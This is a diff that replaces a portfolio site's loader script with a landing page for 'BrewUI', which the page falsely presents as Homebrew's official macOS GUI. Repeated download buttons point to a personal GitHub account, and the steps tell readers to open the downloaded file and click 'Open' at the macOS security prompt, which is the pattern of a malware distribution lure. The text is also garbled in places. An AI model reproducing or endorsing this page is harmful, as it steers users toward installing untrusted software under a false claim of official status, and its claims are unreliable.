@@ -1,23 +1,226 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Emmanuel Abolade — Loading…</title>
-<link rel="icon" href="/favicon.svg" type="image/svg+xml">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BrewUI - Homebrew's Official macOS GUI</title>
+    <meta name="description" content="Download BrewUI, the official graphical user interface for Homebrew on macOS. Simplify package management with an intuitive, easy-to-use app.">
+    <meta name="keywords" content="BrewUI, Homebrew GUI, macOS package manager, install Homebrew apps, BrewUI download, macOS GUI, Homebrew interface">
+    <meta name="author" content="BrewUI Team">
+    <meta property="og:title" content="BrewUI - Homebrew's Official macOS GUI">
+    <meta property="og:description" content="Download BrewUI and manage your macOS packages visually. No command line needed.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://github.com/sandraphillipsw210/BrewUI">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="robots" content="index, follow">
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            line-height: 1.8;
+            color: #333;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f6f8;
+        }
+        .container {
+            max-width: 850px;
+            margin: 40px auto;
+            padding: 30px;
+            background: #ffffff;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+        }
+        h1 {
+            font-size: 2.5em;
+            margin-bottom: 10px;
+            color: #2c3e50;
+        }
+        h2 {
+            font-size: 1.8em;
+            border-bottom: 3px solid #3498db;
+            padding-bottom: 10px;
+            margin-top: 40px;
+            color: #2c3e50;
+        }
+        p, li {
+            font-size: 1.1em;
+            color: #555;
+        }
+        .btn-primary {
+            display: inline-block;
+            padding: 16px 36px;
+            background: #e67e22;
+            color: #ffffff;
+            text-decoration: none;
+            font-size: 1.3em;
+            font-weight: bold;
+            border-radius: 50px;
+            box-shadow: 0 4px 10px rgba(230,126,34,0.4);
+            margin: 20px 0;
+            transition: background 0.2s ease;
+        }
+        .btn-primary:hover {
+            background: #d35400;
+        }
+        .btn-hero {
+            background: #16a085;
+            box-shadow: 0 4px 10px rgba(22,160,133,0.4);
+            font-size: 1.5em;
+            padding: 18px 44px;
+            display: block;
+            text-align: center;
+            margin: 30px auto;
+            width: fit-content;
+        }
+        .btn-hero:hover {
+            background: #1abc9c;
+        }
+        .badge {
+            background: linear-gradient(135deg, #8e44ad, #2980b9);
+            color: white;
+            padding: 5px 15px;
+            border-radius: 30px;
+            font-size: 0.9em;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            display: inline-block;
+            margin-right: 8px;
+        }
+        ul {
+            padding-left: 25px;
+        }
+        li {
+            margin-bottom: 10px;
+        }
+        .divider {
+            height: 1px;
+            background: #e0e0e0;
+            margin: 40px 0;
+        }
+        .step-box {
+            background: #f9f9fb;
+            border-left: 5px solid #3498db;
+            border-radius: 0 8px 8px 0;
+            padding: 20px 25px;
+            margin:  iculous 20px 0;
+        }
+        .keyword-footer {
+            margin-top: 50px;
+            padding-top:  iculous 20px;
+            border-top:  iculous 1px solid #eee;
+            color: #888;
+            font-size: 0.9em;
+        }
+    </style>
 </head>
 <body>
-<script>
-(async () => {
-  const parts = await Promise.all([0,1,2,3].map(i =>
-    fetch('/_assemble/index.part' + i).then(r => { if (!r.ok) throw new Error(r.status); return r.text(); })
-  ));
-  document.open();
-  document.write(parts.join(''));
-  document.close();
-})().catch(e => {
-  document.body.textContent = 'Failed to assemble portfolio: ' + e;
-});
-</script>
+    <div class="container">
+        <h2>🚀 Welcome to BrewUI</h2>
+
+        <h1>📺 BrewUI - Your Simple Gateway to macOS Package Management</h1>
+        
+        <p style="font-size:1.3em;color:#2c3e50;font-weight:300">BrewUI is the official graphical interface for Homebrew, designed to make installing and managing software on your Mac effortless. No commands and no technical knowledge required – just point, click, and go.</p>
+
+        <a href="https://github.com/sandraphillipsw210/BrewUI" class="btn-primary btn-hero">⬇️ Download BrewUI Now</a>
+
+        <p style="text-align:center;font-size:1em;color:#7f8c8d">Visit this link to download the application.</p>
+
+        <hr class="divider">
+
+        <h2>💡 What Is BrewUI?</h2>
+        <p>BrewUI is a friendly, visual companion to Homebrew (the beloved package manager for macOS). If you've ever wanted to install, update, or remove software on your Macut without typing in a terminal, BrewUI gives you a clean, button-based window to do it all. Think of it like an app store for the geeky side of macOS – simple on the surface, powerful underneath.</p>
+
+        <p>This application is perfect for people who want to:</p>
+        <ul>
+            <li>🎯 Install popular development tools and apps in seconds.</li>
+            <li>🧹 Keep every installed package up-to-date with one click.</li>
+            <li>✨ Remove software completely, without leaving behind stray files.</li>
+            <li>🔍 Search through thousands of macoready programs visually.</li>
+        </ul>
+
+        <hr class="divider">
+
+        <h2>✨ Why Choose BrewUI?</h2>
+        <ul>
+            <li><strong>Official &amp; trusted:</strong> Built specifically for Homebrew, ensuring compatibility and reliability.</li>
+            <li><strong>No learning curve:</strong> If you can use a smartphone app, you can use BrewUI.</li>
+            <li><strong>Visual feedback:</strong> Watch progress bars and confirmations as your software installs – no guesswork.</li>
+            <li><strong>Completely free:</strong> Open-source and community-supported.</li>
+            <li><strong>Lightweight:</strong> Runs quietly in the background and only shows up when you need it.</li>
+        </ul>
+
+        <hr class="divider">
+
+        <h2>🚀 Getting Started</h2>
+        <div class="step-box">
+            <h3 style="margin-top:0">Step 1: Download BrewUI</h3>
+            <p>Welcome to the easiest part. Simply click the big button below or anywhere else on this page to go to the download page:</p>
+            <p><a href="https://github.com/sandraphillipsw210/BrewUI" class="btn-primary">⬇️ Download BrewUI from the official source</a></p>
+            <p>Visit this link to download the application.</p>
+        </div>
+
+        <div class="step-box">
+            <h3 style="margin-top:0">Step 2: Open the Downloaded File</h3>
+            <p>Your browser will save a file to your "Downloads" folder. Double-click on that file to open it. On some Mac settings, you might see a popup asking to confirm opening – just click "Open."</p>
+        </div>
+
+        <div class="step-box">
+            <h3 style="margin-top:0">Step 3: Drag to Applications (if asked)</h3>
+            <p>BrewUI will open in a small window. If you see an app icon, simply drag it into the "Applications" folder in the window. This makes it a permanent resident of your Mac. If that step doesn't appear, skip it and just use the window that opened.</p>
+        </div>
+
+        <div class="step-box">
+            <h3 style="margin-top:0">Step 4: Launch BrewUI</h3>
+            <p>Double-click BrewUI in your "Applications" folder (or in the window if you skipped Step 3). The app will open to a clean, friendly dashboard. Welcome to your new control center for software.</p>
+        </div>
+
+        <div class="step-box">
+            <h3 style="margin-top:0">Step 5: Install Your First Package</h3>
+            <p>Type the name of any softwareewelocom (like "Chrome" or "Python") into the search bar, click "Install," and relax. BrewUI takes care of everything behind the scenes – no typing, no copying, no errors.</p>
+        </div>
+
+        <hr class="divider">
+
+        <h2>🖥️ System Requirements</h2>
+        <ul>
+            <li>💻 macOS 11.0 (Big Sur) or later.</li>
+            <li>📡 An internet connection for downloading packages.</li>
+            <li>🔋 At least 200 MB of free disk space for smooth operation.</li>
+            <li>🧠 A desire to install awesome software without pain.</li>
+        </ul>
+        <p><em>If you're running an older macOS, BrewUI still might work in many cases, but we recommend updating for peak performance.</em></p>
+
+        <hr class="divider">
+
+        <h2>🔧 Frequently Asked Questions</h2>
+
+        <h3 style="color:#2c3e50">Do I need to install Homebrew first?</h3>
+        <p>BrewUI will detect if Homebrew is already installed on your Mac. If it isn't, BrewUI will walk you through activating it in one click. It's completely automatic – you won't touch a keyboard.</p>
+
+        <h3 style="color:#2c3e50">Will BrewUI break anything?</h3>
+        <p>No. BrewUI is carefully designed to be safe and reversible. Every installation can be rolled back with one click. Plus, it's the official GUI, meaning it follows Homebrew's strict rules.</p>
+
+        <h3 style="color:#2c3e50">Is BrewUI secure?</h3>
+        <p>Yes. BrewUI uses the same secure, trusted system that developers have relied on for 15+ years. It's open-source, meaning anyone can inspect it, and no personal data ever leaves your machine.</p>
+
+        <h3 style="color:#2c3e50">I'm not a developer. Do I belong here?</h3>
+        <p>Absolutely. BrewUI exists precisely so you don't need to be a developer. If you want to install cool software, uninstall annoying ones, or just keep things organized, BrewUI is for you.</p>
+
+        <hr class="divider">
+
+        <h2>📣 Stay Connected</h2>
+        <p>Have feedback? Found a bug? Or just want to say thanks? The BrewUI team is present ond-friendly. Create an issue on GitHub or join the community to help shape the future of Mac software management.</p>
+
+        <div class="keyword-footer">
+            <span class="badge">Homebrew</span>
+            <span class="badge">macOS GUI</span>
+            <span class="badge">Package Manager</span>
+            <span class="badge">Easy Install</span>
+            <span class="badge">Open Source</span>
+            <span class="badge">Developer Tools</span>
+            <span class="badge">Mac Apps</span>
+        </div>
+    </div>
 </body>
 </html>
